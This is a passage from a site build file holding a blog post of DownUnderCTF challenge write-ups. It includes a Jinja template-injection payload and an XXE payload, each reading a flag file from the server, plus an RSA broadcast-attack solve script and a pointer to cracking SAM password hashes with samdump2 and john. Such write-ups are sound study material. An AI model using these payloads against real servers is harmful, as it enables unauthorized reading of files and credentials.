style=\"color:#2B5581;--shiki-dark:#ECC48D\"> don\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">t matter if you pwn by an inch or a m1L3. pwning\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">s\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> pwning.}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">] Got EOF \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">while\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> reading\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> in\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> interactive\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">$\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>",{"headings":150,"imagePaths":154,"frontmatter":138},[151,152],{"depth":30,"slug":27,"text":28},{"depth":65,"slug":153,"text":153},"speedrun-001",[],"downunderctf",{"id":155,"data":157,"body":163,"filePath":164,"digest":165,"rendered":166},{"author":12,"pubDatetime":158,"modDatetime":159,"title":160,"tags":161,"description":162},["Date","2023-04-23T15:22:00.000Z"],["Date","2023-12-21T09:12:47.400Z"],"down-under ctf 2024 challenges",[51],"Solutions I did for down-under 2024","\n# Background Information\n\nCompeted as team Lazy Bums. Sort of lost interest a day in. \n\n## Web\n\n#### Parrot The Emu\nThis code is vulnerable to user-supplied malicious payloads\n\n```python\nuser_input = request.form.get('user_input')\n        try:\n            result = render_template_string(user_input)\n```\n\n{{7*7}} verifies that the code is vulnerable to template injection as it returns 49, which means that the server is processing the inputted template\n\nSending the payload: ```{{ self.__init__.__globals__.__builtins__.open('flag').read() }}``` will return the flag as it reads the flag file defined in the supplied source code files.\n\n#### Zoo Feedback Form\nUpon inspecting the code, we can see that XML is used in the post request sent to the web server\n\n```python\nif request.method == 'POST':\n        xml_data = request.data\n        try:\n            parser = etree.XMLParser(resolve_entities=True)\n            root = etree.fromstring(xml_data, parser=parser)\n        except etree.XMLSyntaxError as e:\n            return render_template_string('\u003Cdiv style=\"color:red;\">Error parsing XML: {{ error }}\u003C/div>', error=str(e))\n        feedback_element = root.find('feedback')\n        if feedback_element is not None:\n            feedback = feedback_element.text\n            return render_template_string('\u003Cdiv style=\"color:green;\">Feedback sent to the Emus: {{ feedback }}\u003C/div>', feedback=feedback)\n        else:\n            return render_template_string('\u003Cdiv style=\"color:red;\">Invalid XML format: feedback element not found\u003C/div>')\n\n    return render_template('index.html')\n```\n\nLoad the web server onto burpsuite.\n\nInspect the post request, you can see that it sends an XML request. This must mean it can be vulnerable to XXE injection\n\nYou can see that an XML request is sent, so we can modify it using a basic XXE injection where we read ```flag.txt``` through an XML entity object\n\n```xml\n\u003C?xml version=\"1.0\" encoding=\"UTF-8\"?>\u003C!DOCTYPE foo [\u003C!ENTITY example SYSTEM \"/app/flag.txt\"> ]>\n\u003Croot>\n  \u003Cfeedback>\n    a&example;\n  \u003C/feedback>\n\u003C/root>\n```\n\nUpon sending, we get the flag. \n\n## Crypto\n#### ShuffleBox\nLet's look at the provide files.\n\n```bash\naaaabbbbccccdddd -> ccaccdabdbdbbada\nabcdabcdabcdabcd -> bcaadbdcdbcdacab\n???????????????? -> owuwspdgrtejiiud\n```\n\n#### Sun Tzu's Perfect Math Class\nJust use chatgpt to solve the riddle.\n\nSolve script for part 2:\n\n```python\nfrom sympy import mod_inverse\nfrom gmpy2 import iroot\n\n# Given values\ne = 3\nc1 = int(\"105001824161664003599422656864176455171381720653815905925856548632486703162518989165039084097502312226864233302621924809266126953771761669365659646250634187967109683742983039295269237675751525196938138071285014551966913785883051544245059293702943821571213612968127810604163575545004589035344590577094378024637\")\nc2 = int(\"31631442837619174301627703920800905351561747632091670091370206898569727230073839052473051336225502632628636256671728802750596833679629890303700500900722642779064628589492559614751281751964622696427520120657753178654351971238020964729065716984136077048928869596095134253387969208375978930557763221971977878737\")\nc3 = int(\"64864977037231624991423831965394304787965838591735479931470076118956460041888044329021534008265748308238833071879576193558419510910272917201870797698253331425756509041685848066195410586013190421426307862029999566951239891512032198024716311786896333047799598891440799810584167402219122283692655717691362258659\")\nn1 = int(\"147896270072551360195753454363282299426062485174745759351211846489928910241753224819735285744845837638083944350358908785909584262132415921461693027899236186075383010852224067091477810924118719861660629389172820727449033189259975221664580227157731435894163917841980802021068840549853299166437257181072372761693\")\nn2 = int(\"95979365485314068430194308015982074476106529222534317931594712046922760584774363858267995698339417335986543347292707495833182921439398983540425004105990583813113065124836795470760324876649225576921655233346630422669551713602423987793822459296761403456611062240111812805323779302474406733327110287422659815403\")\nn3 = int(\"95649308318281674792416471616635514342255502211688462925255401503618542159533496090638947784818456347896833168508179425853277740290242297445486511810651365722908240687732315319340403048931123530435501371881740859335793804194315675972192649001074378934213623075830325229416830786633930007188095897620439987817\")\n\n# Applying Chinese Remainder Theorem\nN = n1 * n2 * n3\nn1_inv = mod_inverse(N // n1, n1)\nn2_inv = mod_inverse(N // n2, n2)\nn3_inv = mod_inverse(N // n3, n3)\n\nC = (c1 * n1_inv * (N // n1) + c2 * n2_inv * (N // n2) + c3 * n3_inv * (N // n3)) % N\n\nm, exact = iroot(C, 3)\nif exact:\n    print(f\"The hidden message is: {m}\")\nelse:\n    print(\"Failed to recover the hidden message.\")\n```\n\n## Forensics\n#### Baby's First Foren\n\nLooking throughout the HTTP object yields the strange phrase `nikto`. Upon further research, nikto is a web vulnerability scanner\n\nFollowing the tcp stream and searching for `nikto` yeilds the version.\n\n#### SAM I AM\n\nUse a tool like `samdump2 system.bak sam.bak` and get the password hashes. Then crack the NT hashes using `john` and get the password","src/content/blog/downunderctf.md","7c0d45cf21905732",{"html":167,"metadata":168},"\u003Ch1 id=\"background-information\">Background Information\u003C/h1>\n\u003Cp>Competed as team Lazy Bums. Sort of lost interest a day in.\u003C/p>\n\u003Ch2 id=\"web\">Web\u003C/h2>\n\u003Ch4 id=\"parrot-the-emu\">Parrot The Emu\u003C/h4>\n\u003Cp>This code is vulnerable to user-supplied malicious payloads\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">user_input \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> request\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">form\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">get\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">user_input\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        try\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            result \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> render_template_string\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">user_input\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>{{7*7}} verifies that the code is vulnerable to template injection as it returns 49, which means that the server is processing the inputted template\u003C/p>\n\u003Cp>Sending the payload: \u003Ccode>{{ self.__init__.__globals__.__builtins__.open('flag').read() }}\u003C/code> will return the flag as it reads the flag file defined in the supplied source code files.\u003C/p>\n\u003Ch4 id=\"zoo-feedback-form\">Zoo Feedback Form\u003C/h4>\n\u003Cp>Upon inspecting the code, we can see that XML is used in the post request sent to the web server\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> request\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">method \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">==\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">POST\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        xml_data \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> request\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">data\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        try\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            parser \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> etree\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">XMLParser\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D7DBE0\">resolve_entities\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#FF5874\">True\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            root \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> etree\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">fromstring\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">xml_data\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D7DBE0\"> parser\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">parser\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        except\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> etree\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">XMLSyntaxError \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">as\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> e\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">            return\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> render_template_string\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">&#x3C;div style=\"color:red;\">Error parsing XML: \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{{\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\"> error \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">&#x3C;/div>\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D7DBE0\"> error\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">str\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">e\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        feedback_element \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> root\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">find\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">feedback\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> feedback_element \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">is\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> not\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#FF5874\"> None\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            feedback \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> feedback_element\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">text\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">            return\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> render_template_string\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">&#x3C;div style=\"color:green;\">Feedback sent to the Emus: \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{{\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\"> feedback \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">&#x3C;/div>\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D7DBE0\"> feedback\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">feedback\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        else\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">            return\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> render_template_string\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">&#x3C;div style=\"color:red;\">Invalid XML format: feedback element not found&#x3C;/div>\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    return\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> render_template\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">index.html\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Load the web server onto burpsuite.\u003C/p>\n\u003Cp>Inspect the post request, you can see that it sends an XML request. This must mean it can be vulnerable to XXE injection\u003C/p>\n\u003Cp>You can see that an XML request is sent, so we can modify it using a basic XXE injection where we read \u003Ccode>flag.txt\u003C/code> through an XML entity object\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"xml\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">&#x3C;?\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#CAECE6\">xml\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic\"> version\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">1.0\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic\"> encoding\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">UTF-8\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">?>&#x3C;!\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">DOCTYPE\u003C/span>\u003Cspan style=\"color:#24292EFF;font-style:inherit;--shiki-dark:#7FDBCA;--shiki-dark-font-style:italic\"> foo\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\"> [\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">&#x3C;!\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">ENTITY\u003C/span>\u003Cspan style=\"color:#24292EFF;font-style:inherit;--shiki-dark:#7FDBCA;--shiki-dark-font-style:italic\"> example\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> SYSTEM \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">/app/flag.txt\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">>\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\"> ]\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">&#x3C;\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#CAECE6\">root\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">  &#x3C;\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#CAECE6\">feedback\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    a\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\">&#x26;example;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">  &#x3C;/\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#CAECE6\">feedback\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">&#x3C;/\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#CAECE6\">root\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Upon sending, we get the flag.\u003C/p>\n\u003Ch2 id=\"crypto\">Crypto\u003C/h2>\n\u003Ch4 id=\"shufflebox\">ShuffleBox\u003C/h4>\n\u003Cp>Let’s look at the provide files.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">aaaabbbbccccdddd\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> -\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">>\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> ccaccdabdbdbbada\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">abcdabcdabcdabcd\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> -\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">>\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> bcaadbdcdbcdacab\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">????????????????\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> -\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">>\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> owuwspdgrtejiiud\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch4 id=\"sun-tzus-perfect-math-class\">Sun Tzu’s Perfect Math Class\u003C/h4>\n\u003Cp>Just use chatgpt to solve the riddle.\u003C/p>\n\u003Cp>Solve script for part 2:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> sympy \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> mod_inverse\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> gmpy2 \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> iroot\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan 